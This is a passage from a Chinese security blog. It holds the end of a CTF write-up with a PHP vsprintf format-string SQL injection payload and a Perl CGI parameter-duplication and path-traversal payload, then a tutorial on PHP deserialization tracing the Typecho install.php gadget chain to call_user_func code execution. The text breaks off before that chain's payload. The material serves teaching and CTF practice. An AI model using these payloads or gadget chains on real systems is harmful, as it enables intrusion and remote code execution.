<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$htmlsafe_username</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$username</span>, ENT_COMPAT | ENT_SUBSTITUTE);</span><br><span class="line"><span class="comment">//这行代码将 $username 变量的值进行 HTML 转义，并将转义后的结果赋给 $htmlsafe_username 变量。</span></span><br><span class="line"><span class="comment">//第一个参数 $username 是需要进行转义的字符串，它的值被传递给 htmlspecialchars() 函数进行处理。</span></span><br><span class="line"><span class="comment">//第二个参数 ENT_COMPAT | ENT_SUBSTITUTE 是转义模式，用于指定转义的规则。</span></span><br><span class="line"><span class="comment">//ENT_COMPAT 表示只转义双引号，将双引号转换为 &amp;quot;。其他特殊字符不转义。</span></span><br><span class="line"><span class="comment">//ENT_SUBSTITUTE 表示将无法转义的字符用 Unicode 替代符号替代，而不是忽略或删除它们。</span></span><br></pre></td></tr></table></figure>

<p>利用 &gt; 被编码为&amp;gt 我们可以构造 %1$’&gt;%2$s</p>
<p>$’是什么意思我们可以看官方手册：</p>
<p>![image-20230907135735471](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230907135735471.png)</p>
<p>也就是上面的字符串要填充 &gt; 但是没写数量所以填充0个就是空了，%1$’&gt;在vsprintf处理时就会变成空，只剩下%2$s</p>
<p>sql语句变成：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> &quot;admin&quot;<span class="operator">||</span><span class="number">1</span>#<span class="operator">%</span><span class="number">2</span>$s&quot; AND password = &quot;<span class="number">34</span>c66477519b949b09b45e131347c17b5822a30a&quot;SELECT * FROM users WHERE username = &quot;admin&quot;||1#%2$s&quot; <span class="keyword">AND</span> password <span class="operator">=</span> </span><br></pre></td></tr></table></figure>

<p>这里解释下为啥%1$’&gt;%2$s 不是按照我们理解的应该两个参数都格式化进去，关键还是文档。</p>
<p><code>%[argnum$][flags][width][.precision]specifier</code>.</p>
<p>官方文档说明这个函数的使用方式如下，其中%和specifier是必须的 也就是说%s是极简模式。我们使用%1$’&lt; 时 有没有发现这个格式的specifier应该是什么？</p>
<p>没有，对没有specifier，所以%1$’&gt;%2$s 就把% 当作specifier了 这个%也就逃逸出来了：</p>
<p>![image-20230908094433300](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230908094433300.png)</p>
<p>其实输出%需要%%的转义和这个原理几乎一摸一样。</p>
<p>后续username需要传入htmlspecialchars($username):</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="operator">%</span><span class="number">1</span>$c<span class="operator">||</span><span class="number">1</span>#<span class="operator">%</span><span class="number">1</span>$<span class="string">&#x27;&amp;gt;%2$s</span></span><br></pre></td></tr></table></figure>

<p>此时拼接完的参数是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$greeting</span> = Hello admin%<span class="number">1</span><span class="variable">$c</span>||<span class="number">1</span><span class="comment">#%1$&#x27;&amp;gt;%2$s, the server time is %s</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$greeting</span>, [<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>), <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>)]);</span><br><span class="line"><span class="number">1</span>、%<span class="number">1</span><span class="variable">$c</span> 被一个字符填充</span><br><span class="line"><span class="number">2</span>、%<span class="number">1</span>$<span class="string">&#x27;&amp;g 被 2023 填充，因为&amp;后面没有数字，所以没有使用&amp;填充，后面specifier标志为为g表示通用格式。可以看官方手册了解详情</span></span><br><span class="line"><span class="string">3、%2$s 被真正的flag填充 最后的%s第一个时间字符串填充</span></span><br></pre></td></tr></table></figure>

<p>最终我们拿到flag</p>
<p>![image-20230908094908451](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230908094908451.png)</p>
<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>上面的$’ 填充使用方式还可以在一些转义逃逸中使用，比如在sql语句中经常有需要闭合的’ 而代码转义了’ 导致我们无法闭合，那么我们可以构造：</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">%<span class="number">1</span><span class="variable">$&#x27;</span>or(<span class="number">1</span>=<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>经过转义变为</p>
<figure class="highlight haml"><table><tr><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">1</span></span>$\&#x27;or(1=1)#</span><br></pre></td></tr></table></figure>

<p>而经过vsprintf时，单引号就逃逸出来了</p>
<p>![image-20230908115035624](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230908115035624.png)</p>
<h4 id="cgi-friday"><a href="#cgi-friday" class="headerlink" title="cgi-friday"></a>cgi-friday</h4><p>直接看题目</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env perl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> CGI::Minimal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> constant <span class="string">HTDOCS =&gt;</span> <span class="string">&#x27;/usr/local/apache2/htdocs&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">read_file</span> </span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($file_path) = @_;</span><br><span class="line">	<span class="keyword">my</span> $fh;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">local</span> $/;</span><br><span class="line">	<span class="keyword">open</span>($fh, <span class="string">&quot;&lt;&quot;</span>, $file_path) <span class="keyword">or</span> <span class="keyword">return</span> <span class="string">&quot;read_file error: $!&quot;</span>;</span><br><span class="line">	<span class="keyword">my</span> $content = &lt;$fh&gt;;</span><br><span class="line">	<span class="keyword">close</span>($fh);</span><br><span class="line">	<span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">route_request</span> </span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($page, $remote_addr) = @_;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^about$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/about.txt&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^version$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;/proc/version&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^cpuinfo$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/denied.txt&#x27;</span> <span class="keyword">unless</span> $remote_addr eq <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;/proc/cpuinfo&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^stat|io|maps$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/denied.txt&#x27;</span> <span class="keyword">unless</span> $remote_addr eq <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;/proc/self/$page&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/home.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">escape_html</span> </span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($text) = @_;</span><br><span class="line"></span><br><span class="line">	$text =~ <span class="regexp">s/&lt;/&amp;lt;/g</span>;</span><br><span class="line">	$text =~ <span class="regexp">s/&gt;/&amp;gt;/g</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $q = CGI::Minimal-&gt;new;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Content-Type: text/html\r\n\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $file_path = route_request($q-&gt;param(<span class="string">&#x27;page&#x27;</span>), $ENV&#123;<span class="string">&#x27;REMOTE_ADDR&#x27;</span>&#125;);</span><br><span class="line"><span class="keyword">my</span> $file_content = read_file($file_path);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> escape_html($file_content);</span><br></pre></td></tr></table></figure>

<p>首先理清楚代码逻辑：</p>
<p>1、$q-&gt;param(‘page’)接受传入的page参数、$ENV{‘REMOTE_ADDR’}拿到请求的ip 一般认为这个是不可伪造的。</p>
<p>2、route_request处理上述请求，当满足以下两点可以拿到flag</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($page =~ <span class="regexp">/^stat|io|maps$/</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/denied.txt&#x27;</span> <span class="keyword">unless</span> $remote_addr eq <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;/proc/self/$page&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 1、page参数是包含io</span></span><br><span class="line"><span class="comment"># 2、$remote_addr 等于 127.0.0.1</span></span><br></pre></td></tr></table></figure>

<p>第一个好绕过，第二个直接想改变$ENV{‘REMOTE_ADDR’}是困难的，但是$q-&gt;param(‘page’)可以接收一个list而不是一个参数，所以我们可以构造两个page的数组一个用来赋值$page,一个用来赋值给$remote_addr</p>
<p>最终payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?page=../../sys/module/vfio/../../../flag.txt&amp;page=127.0.0.1</span><br></pre></td></tr></table></figure>

<p>拿到flag：DUCTF{s qqjust another perl hacker q and print ucfirst}</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈php反序列化</title>
    <url>//posts/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><hr>
<p>php是这个语言是世界上最好的语言( 滑稽 )。php的反序列化也可以说是漏洞众多了，因为它的使用，爆出了很多知名cms的通杀漏洞。而且因为用的人多，所以在其他小众cms中还有很多未被发现的反序列化漏洞，另外CTF中php的反序列化也是常考点，所以这篇来简单讲一下php的反序列化漏洞。当然java的反序列化问题也不少，以后有时间会写java的。  </p>
<h4 id="php反序列化漏洞的核心"><a href="#php反序列化漏洞的核心" class="headerlink" title="php反序列化漏洞的核心"></a>php反序列化漏洞的核心</h4><hr>
<p>其实php反序列化的核心在于两点：  </p>
<ul>
<li>用户可控的反序列化输入点  </li>
<li>可利用的危险函数  <span id="more"></span></li>
</ul>
<p>可控输入点构造利用可利用的危险函数，听起来很简单，但是用的时候又是另一回事。<br>比如商用cms，总是模块化开发，可控点可能全局搜索下就知道了，但是可利用函数要不没有、要不就需要翻找可控点调用的其他的类，而其他类又调用了其他类，这像个递归（哈哈）。所以必须很熟悉某套cms才可能挖到某个cms的漏洞。<br>而ctf比赛中，一般是能让你一眼就看出反序列化的可控点和危险利用的函数。但是总是需要绕过一些东西，比如wakeup中的waf、parse_url的绕过、变量覆盖、结合ssrf等其他的知识点。<br>所以php反序列化是一个原理非常简单、但是玩儿起来还是略微有点困难的东西。  </p>
<h4 id="php反序列化的基础知识"><a href="#php反序列化的基础知识" class="headerlink" title="php反序列化的基础知识"></a>php反序列化的基础知识</h4><hr>
<p>在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。这是php反序列化的用处。很多需要存储和传输的东西如果不方便传输（比如对象）我们就会进行序列化后操作。所以我们寻找反序列化就要站在开发的角度思考什么时候用到序列化？另外我们渗透测试过程中看到序列化完的参数在我们抓取的包中传递，那么也应该警觉反序列化漏洞。<br>先来看一个简单的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$dog_name</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dog_move</span>(<span class="params"><span class="variable">$dog_action</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$dog_action</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dog</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;dog_name=<span class="string">&quot;jim&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">dog_move</span>(<span class="string">&quot;wang ~&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;dog&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;dog_name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;jim&quot;</span>;&#125; <span class="comment">//这就是上面的dog的一个实例序列化的字符串</span></span><br></pre></td></tr></table></figure>
<p>各个缩写的含义</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">a -<span class="built_in"> array </span> </span><br><span class="line">b - boolean  </span><br><span class="line">d -<span class="built_in"> double </span> </span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure>
<p>好了反序列化形成的字符串看明白了，但是序列化反序列化还有一些魔术方法我们也需要学习：</p>
<ul>
<li>__wakeup()      当序列化时调用 serialize  </li>
<li>__construct():   当一个类被创建时自动调用  </li>
<li>__destruct():     当一个类被销毁时自动调用</li>
<li>__invoke():       当把一个类当作函数使用时自动调用  </li>
<li>__tostring():      当把一个类当作字符串使用时自动调用  </li>
<li>__wakeup():     当调用unserialize()函数时自动调用  </li>
<li>__sleep():         当调用serialize()函数时自动调用  </li>
<li>__call():            当要调用的方法不存在或权限不足时自动调用  </li>
<li>__get()             用于从不可访问的属性读取数据  </li>
<li>__set()             用于将数据写入不可访问的属性  </li>
<li>__isset()           在不可访问的属性上调用isset()或empty()触发  </li>
<li>__unset()         在不可访问的属性上使用unset()时触发</li>
</ul>
<p>然后我们需要知道一点骚技巧：</p>
<ul>
<li>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</li>
<li>反序列化结合phar file等伪协议进行的文件读取和上传shell的操作</li>
<li>反序列化完的字符串各类型可见字符串长度与所显示类型长度不匹配时，注意%00非打印字符的问题 非常常见！  </li>
<li>如果在destruct()函数在反序列化触发时，有文件引入，反序列化时需要使用文件的绝对路径，因为destruct在反序列化触发时的工作目录在php根目录。</li>
<li>通常反序列化字段在部分可控时会用到反序列化逃逸技巧，不过只在CTF中见过，通过指定字符长度来逃逸，防止参数被当作字符串处理，比较常见的就是waf替换来绕过长度。详情参考0CTF-2016-piapiapia。</li>
</ul>
<h4 id="php反序列化的例子"><a href="#php反序列化的例子" class="headerlink" title="php反序列化的例子"></a>php反序列化的例子</h4><h5 id="Typecho反序列化漏洞导致前台getshell"><a href="#Typecho反序列化漏洞导致前台getshell" class="headerlink" title="Typecho反序列化漏洞导致前台getshell"></a>Typecho反序列化漏洞导致前台getshell</h5><p>前段时间Typecho的一个后门，利用了反序列化来隐藏，利用链长度属于中等吧，大家都可以看着跟一下，非常适合入门。</p>
<p>install.php文件里面有个后门<br>229~235行代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;__typecho_config&#x27;</span>))); <span class="comment">//关键控制点</span></span><br><span class="line"><span class="title class_">Typecho_Cookie</span>::<span class="title function_ invoke__">delete</span>(<span class="string">&#x27;__typecho_config&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Db</span>(<span class="variable">$config</span>[<span class="string">&#x27;adapter&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>]); <span class="comment">//这里后面也会用到</span></span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">addServer</span>(<span class="variable">$config</span>, <span class="title class_">Typecho_Db</span>::<span class="variable constant_">READ</span> | <span class="title class_">Typecho_Db</span>::<span class="variable constant_">WRITE</span>);</span><br><span class="line"><span class="title class_">Typecho_Db</span>::<span class="title function_ invoke__">set</span>(<span class="variable">$db</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码分析发现上述代码的触发条件有两个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;finish&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(__TYPECHO_ROOT_DIR__ . <span class="string">&#x27;/config.inc.php&#x27;</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;typecho&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>) || !<span class="keyword">empty</span>(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;port&#x27;</span>]) &amp;&amp; <span class="variable">$parts</span>[<span class="string">&#x27;port&#x27;</span>] != <span class="number">80</span> &amp;&amp; !<span class="title class_">Typecho_Common</span>::<span class="title function_ invoke__">isAppEngine</span>()) &#123;</span><br><span class="line">        <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>] = <span class="string">&quot;<span class="subst">&#123;$parts[&#x27;host&#x27;]&#125;</span>:<span class="subst">&#123;$parts[&#x27;port&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] != <span class="variable">$parts</span>[<span class="string">&#x27;host&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先$_GET[‘finish’]不为空，很好满足，其次host需要是本站地址也很好满足，所以可实现。</p>
<p>那么__typecho_config是需要我们控制的反序列化点，那么这个我们能不能控制呢？直接看获取__typecho_config的get函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="variable">$_prefix</span> . <span class="variable">$key</span>;</span><br><span class="line">    <span class="variable">$value</span> = <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="variable">$key</span>]) ? <span class="variable">$_COOKIE</span>[<span class="variable">$key</span>] : (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]) ? <span class="variable">$_POST</span>[<span class="variable">$key</span>] : <span class="variable">$default</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) ? <span class="variable">$default</span> : <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中可以看到$_COOKIE为空时我们直接POST数据即可控制__typecho_config，然后我们就需要找到危险函数来进行触发。<br>经过全局搜索(当然过程肯定很麻烦，各种危险函数和魔术方法都要过一遍)发现Feed.php文件的__toString() 方法的290行左右代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_items <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;item&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;title&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;title&#x27;</span>]) . <span class="string">&#x27;&lt;/title&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;link&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/link&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;guid&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/guid&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;pubDate&gt;&#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dateFormat</span>(<span class="variable">$item</span>[<span class="string">&#x27;date&#x27;</span>]) . <span class="string">&#x27;&lt;/pubDate&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;dc:creator&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="comment">//下面的代码不重要</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们通过基础知识点得知 当把一个类当作字符串使用时自动调用toString方法，而上面的install.php文件的232行有一行这样的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Db</span>(<span class="variable">$config</span>[<span class="string">&#x27;adapter&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>这里， 跟进Typecho_Db， 有一行代码是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$adapterName</span> = ‘Typecho_Db_Adapter_’ . <span class="variable">$adapterName</span>;</span><br></pre></td></tr></table></figure>
<p>这里的$adapterName就对应着config里面的adapter，这里用了拼接操作，PHP是弱类型的语言，把一个字符串和一个类拼接的时候，会强制把类转换成字符串，所以就会触发传进来的这个类的__toString方法。所以adapter设置为一个类，那么就可以触发这个类的toString()方法。现在我们返回上面Feed.php的__tostring 。<br>其中调用了$item[‘author’]-&gt;screenName，$item是$this-&gt;items的foreach循环出来的，并且$this-&gt;items是Typecho_Feed类的一个private属性。所以我们可以利用这个$item来调用某个类的get()方法，上面说过get()方法是用于从不可访问的属性读取数据，实际执行中这里会获取该类的screenName属性，如果我们给$item[‘author’]设置的类中没有screenName就会执行该类的get()方法，我们继续来全局搜索一下get()方法。<br>&#x2F;var&#x2F;Typecho&#x2F;Request.php中有可利用的__get()方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//get方法如下</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//下面时上面get方法代码调用的get方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_params[<span class="variable">$key</span>]):</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;_params[<span class="variable">$key</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>]):</span><br><span class="line">            <span class="variable">$value</span> = <span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$value</span> = !<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>) &gt; <span class="number">0</span> ? <span class="variable">$value</span> : <span class="variable">$default</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_applyFilter</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码最后一行发现 $this-&gt;_applyFilter($value);:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_filter <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) ? <span class="title function_ invoke__">array_map</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>) :</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到 call_user_func 危险函数，它在传入参数$value不是数组的时候调用，array_map 在传入参数$value是数组的时候调用。所以利用链就明确了：直接构造一个数组 键值为 assert phpinfo<br>payload如下(参考了网上的payload)</p>
